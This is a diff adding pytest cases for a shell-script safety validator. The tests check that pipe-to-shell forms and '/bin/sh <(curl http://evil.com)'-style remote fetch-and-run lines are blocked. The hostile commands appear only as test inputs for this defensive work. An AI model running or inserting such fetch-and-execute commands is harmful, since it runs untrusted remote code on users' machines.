@@ -321,3 +321,33 @@ def test_shellcheck_timeout_graceful(monkeypatch):
     # If shellcheck times out, it should log a warning and continue gracefully
     content = "echo 'safe content'"
     assert validate_rendered_output(content, "setup.sh") == content
+
+
+def test_ast_absolute_path_and_env_pipeline_blocked():
+    # Pipeline tests
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("cat script.sh | /bin/sh", "setup.sh")
+    assert "Pipe-to-shell detected in pipeline" in str(exc_info.value)
+
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("cat script.sh | env bash", "setup.sh")
+    assert "Pipe-to-shell detected in pipeline" in str(exc_info.value)
+
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("cat script.sh | /usr/bin/env sh", "setup.sh")
+    assert "Pipe-to-shell detected in pipeline" in str(exc_info.value)
+
+
+def test_ast_absolute_path_and_env_dynamic_args_blocked():
+    # Dynamic argument checks
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("/bin/sh <(curl http://evil.com)", "setup.sh")
+    assert "executed with dynamic subshell/substitution" in str(exc_info.value)
+
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("env bash <(curl http://evil.com)", "setup.sh")
+    assert "executed with dynamic subshell/substitution" in str(exc_info.value)
+
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("/usr/bin/env sh <(curl http://evil.com)", "setup.sh")
+    assert "executed with dynamic subshell/substitution" in str(exc_info.value)
